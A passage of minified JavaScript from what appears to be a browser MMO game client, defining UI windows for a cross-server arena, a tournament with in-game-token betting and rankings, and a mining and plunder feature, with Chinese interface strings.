o.GuildMemberInfo&&(this.itemData=this.data),this.data&&(this.nameLab.text=this.itemData.name,this.powerLab.text=gettext("战力：{0}",s.CommonUtils.overLengthNo(this.itemData.attack)),this.scoreLab.text=gettext("积分：{0}",this.itemData.score),this.winRateLab.text=gettext("胜率：{0}%",this.itemData.winRate),this.face.source="yuanhead"+this.itemData.job+"1",this.vipTitle.visible=0!=this.itemData.vipLevel)},e.prototype.onTap=function(t){return this.itemData?Math.abs(a.KfArenaSys.ins().score-this.itemData.score)>200?void r.TipsCT.ins().showTips(gettext("积分相差太多，不能邀请")):this.itemData.KfArenaCount<=0?void r.TipsCT.ins().showTips(gettext("对方已没有次数了，不能邀请")):this.itemData.isJoinkfArena?void r.TipsCT.ins().showTips(gettext("对方已加入别的队伍，不能邀请")):void a.KfArenaSys.ins().sendInvite(this.itemData.roleID):void 0},e.prototype.destruct=function(){this.inviteBtn.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e}(n.BaseItemRender);e.kfArenaMemberItemRender=l,window.kfArenaMemberItemRender=l,__reflect(l.prototype,"kfArenaMemberItemRender",[]),window.kfArenaMemberItemRender=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.kfArenaCheckWin=void 0;var n=i(1),o=i(47),s=i(24),a=i(44),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="kfArenaCheckSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.bgClose,this.onTouch),this.addTouchEvent(this.outBtn,this.onTouch),this.addTouchEvent(this.checkBtn,this.onTouch),this.data=t[0],this.update()},e.prototype.update=function(){this.currentState=o.KfArenaSys.ins().isTFCaptain?"normal":"check",this.nameLab.text=this.data.roleName,this.powerLab.text=gettext("战力：{0}",s.CommonUtils.overLengthNo(this.data.power)),this.scoreLab.text=gettext("积分：{0}",this.data.score),this.winRateLab.text=gettext("胜率：{0}%",this.data.winRate),this.face.source="yuanhead"+this.data.job+"1"},e.prototype.onTouch=function(t){switch(t.target){case this.bgClose:break;case this.outBtn:o.KfArenaSys.ins().sendOutTeam(this.data.roleID);break;case this.checkBtn:a.ReadPlayerCT.ins().sendFindPlayer(this.data.roleID,this.data.serverId)}win.close(this)},e}(n.BaseView);e.kfArenaCheckWin=r,window.kfArenaCheckWin=r,__reflect(r.prototype,"kfArenaCheckWin",[]),window.kfArenaCheckWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaWin=void 0;var n=i(1),o=i(0),s=i(7),a=i(2),r=i(26),l=i(141),h=i(47),u=i(1235),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KfArenaSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.viewStack.selectedIndex=u.KfArenaPage.Select_Macth,this.tab.dataProvider=this.viewStack,this.addChangeEvent(this.tab,this.onTabTouch),this.addChangingEvent(this.tab,this.onTabTouching),this.redPointEx()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.redPointEx,l.KfArenaRedPoint.ins().postRedPoint),this.tab.selectedIndex=this.viewStack.selectedIndex=isNaN(t[0])?u.KfArenaPage.Select_Macth:t[0],this.setOpenIndex(this.tab.selectedIndex)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return h.KfArenaSys.ins().isServerOpen?o.GlobalConfig.CrossArenaBase.openDay>s.GameServerCC.serverOpenDay+1?(a.TipsCT.ins().showTips(gettext("|C:{0}&T:开服{1}天开启|",15937822,o.GlobalConfig.CrossArenaBase.openDay)),!1):r.ZsCT.ins().lv<o.GlobalConfig.CrossArenaBase.zhuanshengLevel?(a.TipsCT.ins().showTips(gettext("|C:{0}&T:转生等级{1}转开启|",15937822,o.GlobalConfig.CrossArenaBase.zhuanshengLevel)),!1):!0:(a.TipsCT.ins().showTips(gettext("|C:{0}&T:跨服内所有服务器都达到开服{1}天后开启跨服竞技场玩法|",15937822,o.GlobalConfig.CrossArenaBase.openDay)),!1)},e.prototype.onTabTouching=function(t){return this.checkIsOpen(t.currentTarget.selectedIndex)?void 0:void t.preventDefault()},e.prototype.checkIsOpen=function(t){return!0},e.prototype.onTouch=function(t){},e.prototype.onTabTouch=function(t){this.redPointEx(),this.setOpenIndex(t.currentTarget.selectedIndex)},e.prototype.setOpenIndex=function(t){this.oldIndex=t},e.prototype.redPointEx=function(){var t=this.tab.getElementAt(0);t.eRp.visible=l.KfArenaRedPoint.ins().redpoint_1>0,t=this.tab.getElementAt(2),t.eRp.visible=l.KfArenaRedPoint.ins().redpoint_2>0,t=this.tab.getElementAt(3),t.eRp.visible=l.KfArenaRedPoint.ins().redpoint_3>0,this.tab.updateReds()},e.prototype.tabRp=function(){return l.KfArenaRedPoint.ins().redpoint>0},__decorate([delayCall(100)],e.prototype,"redPointEx",null),e}(n.BaseView);e.KfArenaWin=p,window.KfArenaWin=p,__reflect(p.prototype,"KfArenaWin",[]),window.KfArenaWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaPage=void 0;var n;!function(t){t[t.Select_Macth=0]="Select_Macth",t[t.Select_Rank=1]="Select_Rank",t[t.Select_Join=2]="Select_Join",t[t.Select_Duan=3]="Select_Duan"}(n=e.KfArenaPage||(e.KfArenaPage={})),window.KfArenaPage=n},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakBetWin=void 0;var n=i(1),o=i(0),s=i(6),a=i(2),r=i(97),l=i(73),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BetSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.numLabel.restrict="0-9",this.numLabel.maxChars=8,this.arrow0.visible=!1,this.arrow1.visible=!1,this.aPlayerGroup=this.face0.parent,this.aPlayerGroup.touchChildren=!1,this.bPlayerGroup=this.face1.parent,this.bPlayerGroup.touchChildren=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.betBtn,this.onTouch),this.addTouchEvent(this.maxBtn,this.onTouch),this.addTouchEvent(this.aPlayerGroup,this.onTouch),this.addTouchEvent(this.bPlayerGroup,this.onTouch),this.addChangeEvent(this.numLabel,this.changeInput);var i=t[0],n=t[1],a=l.PeakedSys.ins().isKFSixteen(),h=l.PeakedSys.ins().isKf()?r.PeakedHelp.getKFPlayerData(i,n,t[2],a):r.PeakedHelp.getPlayerData(i,n);if(h){var u=h.playerList[0];this.face0.source=u?"yuanhead"+u.job+u.sex:"",this.name0.text=u?u.playerName:"---",this.select0.name=u?u.roleId+"":"";var p=h.playerList[1];this.face1.source=p?"yuanhead"+p.job+p.sex:"",this.name1.text=p?p.playerName:"---",this.select1.name=p?p.roleId+"":""}this.select0.visible=this.select1.visible=!1;var d=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,o.GlobalConfig.PeakRaceBase.begitem),c=l.PeakedSys.ins().isKf()?o.GlobalConfig.PeakRaceCrossTime[l.PeakedSys.ins().kfStatus+1].maxBett:o.GlobalConfig.PeakRaceTime[l.PeakedSys.ins().bfStatus+1].maxBett;this._maxNum=d>c?c:d,this.changeInput(null)},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this.betBtn,this.onTouch),this.removeTouchEvent(this.maxBtn,this.onTouch),this.addChangingEvent(this.numLabel,this.changeInput)},e.prototype.changeInput=function(t){var e=parseInt(this.numLabel.text);null==t&&(e=this._maxNum),0>e||!e?e=0:e>this._maxNum&&(e=this._maxNum),this.numLabel.text=e+""},e.prototype.onTouch=function(t){switch(t.target){case this.betBtn:var e=parseInt(this.numLabel.text);if(this._curId){if(0>=e)return void a.TipsCT.ins().showTips(gettext("巅峰令牌"));l.PeakedSys.ins().isKf()?l.PeakedSys.ins().sendKFBet(this._curId,e):l.PeakedSys.ins().sendBet(this._curId,e),win.close("PeakBetWin")}else a.TipsCT.ins().showTips(gettext("请先选择需要支持的玩家"));break;case this.maxBtn:this.changeInput(null);break;case this.aPlayerGroup:this.select0.name&&(this.select0.visible=!0,this.select1.visible=!1,this.arrow0.visible=!0,this.arrow1.visible=!1,this._curId=parseInt(this.select0.name));break;case this.bPlayerGroup:this.select1.name&&(this.select1.visible=!0,this.select0.visible=!1,this.arrow0.visible=!1,this.arrow1.visible=!0,this._curId=parseInt(this.select1.name))}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=t[1],o=l.PeakedSys.ins().isKFSixteen(),s=l.PeakedSys.ins().isKf()?r.PeakedHelp.getKFPlayerData(i,n,t[2],o):r.PeakedHelp.getPlayerData(i,n);return s&&s.playerList.length>1?!0:s&&1==s.playerList.length?(a.TipsCT.ins().showTips(gettext("人数不足，无法支持！")),!1):(a.TipsCT.ins().showTips(gettext("本轮轮空,无法支持！")),!1)},e}(n.BaseView);e.PeakBetWin=h,window.PeakBetWin=h,__reflect(h.prototype,"PeakBetWin",[]),window.PeakBetWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakMyBattleRecordWin=void 0;var n=i(1),o=i(1241),s=i(73),a=i(97),r=i(16),l=i(44),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="MyRecordSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.PeakMyBattleRecordItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.list,this.onTouchList);var i=[];s.PeakedSys.ins();s.PeakedSys.ins().isKf()?(i=s.PeakedSys.ins().myKFBattleReportList,i=a.PeakedHelp.countKFMyRecordData()):i=s.PeakedSys.ins().myBattleReportList,this.list.dataProvider=new eui.ArrayCollection(i),r.DisplayUtils.scrollerToBottom(this.scrollerList)},e.prototype.onTouchList=function(t){if(t.target instanceof eui.Label&&t.target.parent instanceof o.PeakMyBattleRecordItemRender){var e=t.target.parent.data;e&&l.ReadPlayerCT.ins().sendFindPlayer(e.roleId)}},e}(n.BaseView);e.PeakMyBattleRecordWin=h,window.PeakMyBattleRecordWin=h,__reflect(h.prototype,"PeakMyBattleRecordWin",[]),window.PeakMyBattleRecordWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakMyBattleRecordItemRender=void 0;var n=i(3),o=i(73),s=i(89),a=i(18),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data.playerName){var t=this.data.round?gettext("第{0}场",this.data.round):"";o.PeakedSys.ins().isKf()?this.roundInfo.text=""+s.PeakedData.SERV_CN[1]+s.PeakedData.STATE_KF_TYPE_CN[this.data.stateType]+" "+t:this.roundInfo.text=""+s.PeakedData.SERV_CN[0]+s.PeakedData.STATE_TYPE_CN[this.data.stateType]+" "+t,this.enemyLabel.text=this.data.playerName,this.result.text=this.data.result?gettext("胜利"):gettext("失败"),this.result.textColor=this.data.result?a.ColorUtil.GREEN:a.ColorUtil.RED}},e}(n.BaseItemRender);e.PeakMyBattleRecordItemRender=r,window.PeakMyBattleRecordItemRender=r,__reflect(r.prototype,"PeakMyBattleRecordItemRender",[]),window.PeakMyBattleRecordItemRender=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakMyBetRecordWin=void 0;var n=i(1),o=i(1243),s=i(73),a=i(97),r=i(18),l=i(5),h=i(16),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="MyBetRecordSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=o.PeakMyBetItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updata,s.PeakedSys.ins().postKFBetInfo),this.updata()},e.prototype.updata=function(){var t=[],e=0,i=0,n=s.PeakedSys.ins().isKf()?s.PeakedSys.ins().kfBetInfo:s.PeakedSys.ins().betInfo;if(n)for(var o=0,u=n;o<u.length;o++){var p=u[o];e+=p.batNum,t.push(p),a.PeakedHelp.statusIsOver(p.status,s.PeakedSys.ins().isKf())&&(a.PeakedHelp.checkIsWinById(p.playerId,p.status)?i+=p.batNum:i-=p.batNum)}var d=i>0?gettext("，|C:{0}&T:获利：{1}|",r.ColorUtil.GREEN,i):gettext("|C:{0}&T:损失：{1}荣耀|",r.ColorUtil.RED,-i);0==i&&(d="");var c=gettext("你已经支持{0}场比赛，支持总额: |C:{1}&T:{2}|荣耀{3}",t.length,r.ColorUtil.GREEN,e,d);this.infoLabel.textFlow=l.TextFlowMaker.generateTextFlow1(c),t.sort(a.PeakedHelp.sortBetFun),this.eList.dataProvider=new eui.ArrayCollection(t),h.DisplayUtils.scrollerToBottom(this.scrollerList)},e}(n.BaseView);e.PeakMyBetRecordWin=u,window.PeakMyBetRecordWin=u,__reflect(u.prototype,"PeakMyBetRecordWin",[]),window.PeakMyBetRecordWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakMyBetItemRender=void 0;var n=i(3),o=i(89),s=i(73),a=i(97),r=i(18),l=i(5),h=i(0),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t;if(this.data instanceof o.PeakBetData){var e=h.GlobalConfig.PeakRaceBase.begitem,i=(null===(t=h.GlobalConfig.ItemConfig[e])||void 0===t?void 0:t.name)||"";s.PeakedSys.ins().isKf()?this.eTitle.text=o.PeakedData.SERV_CN[1]+o.PeakedData.STATE_KF_TYPE_CN[this.data.status]:this.eTitle.text=o.PeakedData.SERV_CN[0]+o.PeakedData.STATE_TYPE_CN[this.data.status];var n="";n=a.PeakedHelp.statusIsOver(this.data.status,s.PeakedSys.ins().isKf())?a.PeakedHelp.checkIsWinById(this.data.playerId,this.data.status)?gettext("|C:{0}&T:获利{1}{2}|",r.ColorUtil.GREEN,this.data.batNum,i):gettext("|C:{0}&T:损失{1}{2}|",r.ColorUtil.RED,this.data.batNum,i):a.PeakedHelp.checkIsWinById(this.data.playerId,this.data.status)?gettext("|C:{0}&T:获利{1}{2}|",r.ColorUtil.GREEN,this.data.batNum,i):gettext("等待结果中...");var u=a.PeakedHelp.findPlayerDtById(this.data.playerId);this.eLab.textFlow=l.TextFlowMaker.generateTextFlow1(gettext("下注【{0}】 {1}{2}{3}",u.playerName,this.data.batNum,i,n))}this.eResult.text=""},e}(n.BaseItemRender);e.PeakMyBetItemRender=u,window.PeakMyBetItemRender=u,__reflect(u.prototype,"PeakMyBetItemRender",[]),window.PeakMyBetItemRender=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakTopRankWin=void 0;var n=i(1),o=i(1245),s=i(73),a=i(44),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SupportRankSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.PeakTopRankItemRender,this._listDt=new eui.ArrayCollection,this.list.dataProvider=this._listDt},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.onSingUp,s.PeakedSys.ins().postSignUp),observe(this,this.upList,s.PeakedSys.ins().postTopRank),observe(this,this.upList,s.PeakedSys.ins().postKFTopRank),this.addTouchEvent(this.list,this.onTouch),this.onSingUp()},e.prototype.onSingUp=function(){s.PeakedSys.ins().isKf()?s.PeakedSys.ins().sendKFTopRank():s.PeakedSys.ins().sendTopRank()},e.prototype.upList=function(){s.PeakedSys.ins().isKf()?this._listDt.replaceAll(s.PeakedSys.ins().kfTopRankInfoList):this._listDt.replaceAll(s.PeakedSys.ins().topRankInfoList)},e.prototype.onTouch=function(t){if(t.target.parent instanceof o.PeakTopRankItemRender){var e=t.target.parent.data;return void(t.target instanceof eui.Button?s.PeakedSys.ins().isKf()?s.PeakedSys.ins().sendKFToLikes(e.playerId):s.PeakedSys.ins().sendToLikes(e.playerId):t.target instanceof eui.Label&&a.ReadPlayerCT.ins().sendFindPlayer(e.playerId,e.servId))}},e}(n.BaseView);e.PeakTopRankWin=r,window.PeakTopRankWin=r,__reflect(r.prototype,"PeakTopRankWin",[]),window.PeakTopRankWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakTopRankItemRender=void 0;var n=i(3),o=i(89),s=i(0),a=i(97),r=i(73),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.data instanceof o.PeakTopRankData&&(this.nameLabel.text=this.data.playerName,this.score.text=this.data.likeNum*s.GlobalConfig.PeakRaceBase.likeScore+"",this.supportBtn.visible=a.PeakedHelp.canSupport(),r.PeakedSys.ins().kideNum>=s.GlobalConfig.PeakRaceBase.likeCount&&(this.supportBtn.enabled=!1),this.data.rank<=3?(this.rankImg.source="paihang"+this.data.rank,this.rank.text=""):(this.rank.text=this.data.rank+"",this.rankImg.source=""),r.PeakedSys.ins().isKf()?this.eOverLab.visible=r.PeakedSys.ins().kfStatusIsEnd&&r.PeakedSys.ins().kfStatus==o.KF_PeakStatus.Finals:this.eOverLab.visible=r.PeakedSys.ins().bfStatusIsEnd&&r.PeakedSys.ins().bfStatus==o.BF_PeakStatus.Finals,this.supportBtn.visible=!this.eOverLab.visible)},e}(n.BaseItemRender);e.PeakTopRankItemRender=l,window.PeakTopRankItemRender=l,__reflect(l.prototype,"PeakTopRankItemRender",[]),window.PeakTopRankItemRender=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakViewBattleReportWin=void 0;var n=i(1),o=i(1247),s=i(73),a=i(97),r=i(0),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WarReportSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.PeakViewBattleReportItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=t[1],o=s.PeakedSys.ins().isKFSixteen(),l=s.PeakedSys.ins().isKf()?a.PeakedHelp.getKFPlayerData(i,n,t[2],o):a.PeakedHelp.getPlayerData(i,n),h=[],u=0,p=0,d=r.GlobalConfig.PeakRaceBase.promWin;if(d||(d=3),l)if(0==l.playerList.length)this.AnameTxt.text=gettext("无选手"),this.BnameTxt.text=gettext("无选手");else{l.playerList[0]&&(this.AnameTxt.text=l.playerList[0].playerName),l.playerList[1]?this.BnameTxt.text=l.playerList[1].playerName:this.BnameTxt.text=gettext("轮空");for(var c=a.PeakedHelp.statusIsOverByGroup(i),f=0;5>f;f++){var g=void 0;if(l.reportList[f])g={},g.winer=a.PeakedHelp.findPlayerDtById(l.reportList[f]).playerName,g.round=f+1,l.reportList[f]==l.playerList[0].roleId?u++:p++;else if(c)continue;if(h[f]=g,u>=d||p>=d)break}}else this.AnameTxt.text=gettext("无选手"),this.BnameTxt.text=gettext("无选手");l&&0==l.reportList.length&&!l.playerList[1]&&(u=d),this.score.text=u+"."+p,this.list.dataProvider=new eui.ArrayCollection(h)},e}(n.BaseView);e.PeakViewBattleReportWin=l,window.PeakViewBattleReportWin=l,__reflect(l.prototype,"PeakViewBattleReportWin",[]),window.PeakViewBattleReportWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakViewBattleReportItemRender=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.data?(this.roundTxt.text=gettext("第{0}局",this.data.round),this.player.text=this.data.winer,this.noOpen.visible=!1,this.infoGroup.visible=!0):(this.noOpen.visible=!0,this.infoGroup.visible=!1)},e}(n.BaseItemRender);e.PeakViewBattleReportItemRender=o,window.PeakViewBattleReportItemRender=o,__reflect(o.prototype,"PeakViewBattleReportItemRender",[]),window.PeakViewBattleReportItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakedFBResult=void 0;var n=i(1),o=i(73),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="PeakedNessResultSkin",e.layoutNum=LayoutNum.top,e.AUTO_QUIT_TIME=5,e._curTime=0,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.quitBtn,this.onQuit);var i=t[1];t[0]?(this.bg.source="pe_win",this.win.visible=!0,this.lose.visible=!1,this.winPlayer.text=i):(this.bg.source="pe_lose",this.win.visible=!1,this.lose.visible=!0,this.losePlayer.text=i),Timer.start(1e3,this.AUTO_QUIT_TIME,this.onTick,this),this._curTime=this.AUTO_QUIT_TIME,this.onTick()},e.prototype.onTick=function(){this.quitBtn.label=gettext("退出({0})",--this._curTime),this._curTime<0&&this.onQuit()},e.prototype.onQuit=function(){send(Ts.exitFB),win.close("PeakedFBResult"),o.PeakedSys.ins().isKf()?(o.PeakedSys.ins().crossScene=1,o.PeakedSys.ins().kfStatus>=2&&o.PeakedSys.ins().sendKFInfoList()):Timer.start(300,1,function(){win.open("PlayWayWin",2),o.PeakedSys.ins().bfStatus>=3&&(console.log("state",o.PeakedSys.ins().bfStatus),o.PeakedSys.ins().sendBFInfoList())},this)},e}(n.BaseView);e.PeakedFBResult=s,window.PeakedFBResult=s,__reflect(s.prototype,"PeakedFBResult",[]),window.PeakedFBResult=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakedMainWin=void 0;var n=i(1),o=i(73),s=i(17),a=i(67),r=i(12),l=i(15),h=i(2),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="PeakednessWinSkin",e.openIdx=-1,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];o.PeakedSys.ins().kfTopRankInfoList.length||o.PeakedSys.ins().sendKFTopRank(),t[0]?this.tab.selectedIndex=this.viewStack.selectedIndex=t[0]:this.openIdx>-1?this.tab.selectedIndex=this.viewStack.selectedIndex=this.openIdx:this.tab.selectedIndex=this.viewStack.selectedIndex=0,observe(this,this.updateRedPoint,s.RedPointBaseSys.ins().RpChange),this.updateRedPoint(),this.helpTips=o.PeakedSys.ins().isKf()?32:31},e.prototype.skinComplete=function(){this.baseTab=this.tab,this.baseViewStack=this.viewStack},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.OpenSystem.ins().checkSysOpen(l.SystemType.Peak);return i||(h.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(l.SystemType.Peak)),win.open(a.View_BianQiang,2)),i},e.prototype.tabRp=function(){var t,e,i=null===(t=o.PeakedSys.ins().dzRp)||void 0===t?void 0:t.v,n=null===(e=o.PeakedSys.ins().mbRp)||void 0===e?void 0:e.v;return i||n},e.prototype.updateRedPoint=function(){this.tab.updateReds()},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.baseTab?(this.baseTab.selectedIndex=t[0]||0,this.baseViewStack&&(this.baseViewStack.selectedIndex=t[0]||0)):t&&(this.openIdx=t[0]||0)},e.prototype.removeDisplay=function(){this.skin&&(this.openIdx=-1)},__decorate([delayCall(100)],e.prototype,"updateRedPoint",null),e}(n.BaseView);e.PeakedMainWin=u,window.PeakedMainWin=u,__reflect(u.prototype,"PeakedMainWin",[]),window.PeakedMainWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ServerSwitchIngWin=void 0;var n=i(1),o=i(125),s=i(102),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="KFSwitchServerSkin",e.rectClose=!1,e._tick=0,e.layoutNum=LayoutNum.top,e}return __extends(e,t),e.prototype.skinComplete=function(){this.progressBar.maximum=20,this.progressBar.value=0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._tick=0,Timer.has(this.onTime,this)||Timer.start(100,0,this.onTime,this)},e.prototype.redClose=function(){this.progressBar.value=this.progressBar.maximum,Timer.has(this.closeWin,this)||Timer.start(1e3,1,this.closeWin,this)},e.prototype.closeWin=function(){win.close(this)},e.prototype.onTime=function(){this._tick+=1,this.switchLabel.text=s.KFServerSys.ins().isKFServ?gettext("正在前往跨服..."):gettext("正在回到本服..."),s.KFServerSys.ins().isKFServ||(o.DevildomSys.ins().lastDevildom=!1),this.progressBar.value=this._tick,this._tick>20&&Timer.stop(this.onTime,this)},e}(n.BaseView);e.ServerSwitchIngWin=a,window.ServerSwitchIngWin=a,__reflect(a.prototype,"ServerSwitchIngWin",[]),window.ServerSwitchIngWin=a},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MineInfoWin=void 0;var n=i(1),o=i(174),s=i(5),a=i(4),r=i(2),l=i(30),h=i(8),u=i(7),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="wakuangtipsskin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(o.Mine.ins().postPosInfo,this.update),o.Mine.ins().sendPosInfo(t[0]),this.addTouchEvent(this,this.onClick),this.update()},e.prototype.update=function(t){if(t){this.info=t;var e="C:0xffffff&T:";this.eNum.text=gettext("编号{0}",this.info.posId);var i=gettext("|{0}玩家昵称：|{1}\n",e,this.info.name||gettext("暂无")),n=gettext("|{0}职业：|{1}\n",e,[gettext("暂无"),gettext("战士"),gettext("法师"),gettext("道士"),gettext("刺客"),gettext("弓手")][this.info.job]),o=gettext("|{0}战力：|{1}\n",e,this.info.firePower||gettext("暂无")),a=i+n+o;this.ePlayerLab.textFlow=s.TextFlowMaker.generateTextFlow(a),this.eBtn.label=this.info.actorId>0?gettext("掠夺"):gettext("占领"),this.enterFrame()}},e.prototype.enterFrame=function(){if(this.info){for(var t=o.Mine.ins().getCfgByAreaId(this.info.areaId),e="",i=0,n=this.info.rewards;i<n.length;i++){var a=n[i];e+=""+(e?",":"")+l.RewardData.getRewardStr(a)}e||(e=gettext("暂无"));var r="";if(this.info.actorId>0){var p=Math.max(0,u.GameServerCC.serverTime-this.info.start);r=h.DateUtils.getFormatBySecond(p/1e3,h.DateUtils.TIME_FORMAT_5,3)}r||(r=gettext("暂无"));var d=gettext("|C:0xffffff&T:产出效率：|≈{0}\n",t.produce)+gettext("|C:0xffffff&T:已开采数：||C:0x0000ff&T:{0}|\n",e)+gettext("|C:0xffffff&T:当前体力：|{0}\n",this.info.power||gettext("暂无"))+gettext("|C:0xffffff&T:已开采时间：||C:0x00ff00&T:{0}|",r);this.eKuangLab.textFlow=s.TextFlowMaker.generateTextFlow(d)}},e.prototype.onClick=function(t){switch(t.target){case this.eCloseBtn:win.close(this);break;case this.eBtn:if(!this.info)return;if(this.info.actorId==a.ActorCC.actorID)return void r.TipsCT.ins().showTips(gettext("无法掠夺自己"));o.Mine.ins().sendHoldPos(this.info.posId),win.close(this)}},e}(n.BaseView);e.MineInfoWin=p,window.MineInfoWin=p,__reflect(p.prototype,"MineInfoWin",[]),window.MineInfoWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MineMainWin=void 0;var n=i(1),o=i(174),s=i(5),a=i(18),r=i(0),l=i(1259),h=i(24),u=i(1260),p=i(1261),d=i(7),c=i(8),f=i(4),g=i(6),m=i(2),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;
return e._sn_="WaKuangSkin",e.lastAreaId=0,e.myStartTime=0,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return o.Mine.openCheck(!0)},e.prototype.skinComplete=function(){this.eTips.textFlow=s.TextFlowMaker.generateTextFlow(r.GlobalConfig.HelpInfoConfig[100].text+""),this.eList.itemRenderer=l.MineEnterRenderer,this.eList.touchEnabled=!1,this.eList.touchChildren=!0;var t=h.CommonUtils.objectToArrayShallow(r.GlobalConfig.KuangAreaConfig);t.unshift(null),this.eList.dataProvider=this.listDP=new eui.ArrayCollection(t),this.ePosList.itemRenderer=u.MinePosRenderer,this.ePosList.dataProvider=this.posDP=new eui.ArrayCollection,this.eItemList.itemRenderer=p.MineItemRenderer,this.eItemList.dataProvider=this.itemDP=new eui.ArrayCollection,this.eBar.labelFunction=function(t,e){return gettext("挖掘中：{0}",t.toFixed(0))},this.eBar.visible=!1,this.eBar.value=0,this.eBar.maximum=r.GlobalConfig.CaiKuangConfig.dropInterval},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onClick),this.observe(o.Mine.ins().postInfo,this.updateInfo),this.observe(o.Mine.ins().postAreaInfo,this.updateGrp),this.observe(o.Mine.ins().postLogs,this.updateLog),this.observe(o.Mine.ins().postPosInfo,this.updateMyPos),this.update()},e.prototype.removeDisplay=function(){o.Mine.ins().areaId=0},e.prototype.onClick=function(t){var e;if(t.target&&(null===(e=t.target.parent)||void 0===e?void 0:e.parent)instanceof l.MineEnterRenderer){var i=t.target.parent.parent.getAreaId();i?o.Mine.ins().sendAreaById(i):(o.Mine.ins().areaId=0,this.updateGrp())}if(t.target&&t.target instanceof u.MinePosRenderer)return void 